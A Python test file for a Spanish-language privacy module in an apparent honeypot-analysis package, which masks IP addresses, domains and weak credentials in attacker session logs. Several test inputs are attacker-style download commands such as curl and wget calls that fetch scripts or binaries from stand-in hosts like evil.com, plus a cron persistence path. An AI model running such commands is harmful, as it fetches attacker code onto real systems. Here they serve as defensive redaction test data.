"""Lo que se tapa antes de que un texto llegue a una persona que no lo necesita."""

from __future__ import annotations

from honeyml.api import privacidad


def test_tapa_direcciones_ipv4() -> None:
    assert privacidad.sin_direcciones("ssh root@203.0.113.9") == "ssh root@x.x.x.x"


def test_tapa_una_direccion_pegada_a_letras_o_guiones_bajos() -> None:
    assert privacidad.sin_direcciones("MGLNDD_203.0.113.10_22") == "MGLNDD_x.x.x.x_22"
    assert privacidad.sin_direcciones("Host: 198.51.100.7rnrn") == "Host: x.x.x.xrnrn"


def test_no_tapa_a_medias_un_numero_con_mas_cifras() -> None:
    for texto in ("1234.5.6.7", "1.2.3.4567"):
        assert privacidad.sin_direcciones(texto) == texto


def test_tapa_el_host_de_una_url_pero_deja_el_esquema_y_la_ruta() -> None:
    assert privacidad.sin_direcciones("curl -O http://evil.example.com:8080/mal.sh") == (
        "curl -O http://tapado/mal.sh"
    )


def test_tapa_una_direccion_dentro_de_una_url() -> None:
    assert privacidad.sin_direcciones("wget http://198.51.100.20/a") == "wget http://tapado/a"


def test_tapa_un_dominio_usado_como_host() -> None:
    assert privacidad.sin_direcciones("wget evil.com/x.bin") == "wget tapado/x.bin"


def test_no_toca_lo_que_no_es_un_destino() -> None:
    """Nombres con punto que no son dominios: no se tocan, para no romper el comando."""
    for texto in (
        "uname -a",
        "cat /etc/cron.d/persist",
        "python3.12 -m venv .venv",
        "echo ok > /tmp/a.sh",
    ):
        assert privacidad.sin_direcciones(texto) == texto


def test_entra_a_cualquier_profundidad() -> None:
    dato = {"comando": ["wget http://evil.com/a", {"nota": "desde 203.0.113.9"}]}
    assert privacidad.sin_direcciones(dato) == {
        "comando": ["wget http://tapado/a", {"nota": "desde x.x.x.x"}]
    }


def test_descarta_credenciales_con_forma_de_direccion() -> None:
    cubos = [
        {"key": "root", "count": 9},
        {"key": "203.0.113", "count": 7},
        {"key": "admin", "count": 5},
    ]
    assert privacidad.sin_credenciales_con_direccion(cubos, 2) == [
        {"key": "root", "count": 9},
        {"key": "admin", "count": 5},
    ]


def test_una_credencial_entra_desde_cinco_direcciones() -> None:
    cubos = [
        {"key": "root", "count": 900, "origenes": 300},
        {"key": "justo", "count": 60, "origenes": 5},
        {"key": "casi", "count": 50, "origenes": 4},
        {"key": "198.51.100", "count": 40, "origenes": 30},
    ]
    assert privacidad.credenciales_frecuentes(cubos) == [
        {"key": "root", "count": 900},
        {"key": "justo", "count": 60},
    ]


def test_una_sesion_tapa_la_credencial_que_no_pasa_la_regla() -> None:
    sesiones = [
        {"attacker": "attacker-1", "credentials": {"user": "root", "password": "123456"}},
        {"attacker": "attacker-2", "credentials": {"user": "root", "password": "unica"}},
    ]
    tapadas = privacidad.credenciales_de_sesiones(sesiones, {"root"}, {"123456"})
    assert tapadas[0]["credentials"] == {"user": "root", "password": "123456"}
    assert tapadas[1]["credentials"] == {
        "user": "root",
        "password": privacidad.CREDENCIAL_TAPADA,
    }
    # el resto de la sesión no se toca
    assert tapadas[1]["attacker"] == "attacker-2"


def test_las_contrasenas_de_un_evento_se_ocultan_a_cualquier_profundidad() -> None:
    datos = {
        "evento": {"user.name": "root", "cowrie.password": "123456", "dionaea.password": None},
        "items": [{"evento": {"cowrie.password": "otra"}}],
    }
    oculto = privacidad.sin_contrasenas(datos)
    assert oculto["evento"]["cowrie.password"] == privacidad.CONTRASENA_OCULTA
    # un campo vacío sigue vacío: no se inventa una contraseña que no estaba
    assert oculto["evento"]["dionaea.password"] is None
    assert oculto["evento"]["user.name"] == "root"
    assert oculto["items"][0]["evento"]["cowrie.password"] == privacidad.CONTRASENA_OCULTA
